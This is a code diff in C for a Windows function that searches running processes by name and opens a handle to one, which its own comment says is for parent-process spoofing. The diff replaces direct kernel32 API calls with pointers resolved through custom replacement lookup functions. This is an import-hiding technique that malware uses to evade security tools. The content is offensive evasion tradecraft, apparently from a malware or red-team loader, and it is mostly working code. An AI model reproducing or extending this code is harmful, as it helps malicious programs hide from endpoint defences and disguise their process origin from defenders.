@@ -2,12 +2,18 @@
 
 BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID)
 {
+	// Dynamic Links
+	f_CreateToolhelp32Snapshot rCreateToolhelp32Snapshot = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "CreateToolhelp32Snapshot");
+	f_Process32First rProcess32First = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "Process32First");
+	f_Process32Next rProcess32Next = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "Process32Next");
+	f_OpenProcess rOpenProcess = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "OpenProcess");
+
 	// Get process snapshot
 	HANDLE hProcSnapshot = NULL;
 	PROCESSENTRY32 pProcess = { .dwSize = sizeof(PROCESSENTRY32) };
-	hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	hProcSnapshot = rCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 
-	Process32First(hProcSnapshot, &pProcess);
+	rProcess32First(hProcSnapshot, &pProcess);
 	// Get parent handle
 	HANDLE hTest = NULL;
 	do {
@@ -19,7 +25,7 @@ BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessI
 		if (strcmp(pProcess.szExeFile, sProcessName) == 0 && pProcess.th32ProcessID > 1000) {
 
 			// Try opening a handle with necessary perms for spoofing
-			hTest = OpenProcess(PROCESS_CREATE_PROCESS, NULL, pProcess.th32ProcessID);
+			hTest = rOpenProcess(PROCESS_CREATE_PROCESS, NULL, pProcess.th32ProcessID);
 			if (hTest != NULL)
 			{
 				*hParent = hTest;
@@ -27,7 +33,7 @@ BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessI
 				return EXIT_SUCCESS;
 			}
 		}
-	} while (Process32Next(hProcSnapshot, &pProcess));
+	} while (rProcess32Next(hProcSnapshot, &pProcess));
 
 	return EXIT_FAILURE;
 }
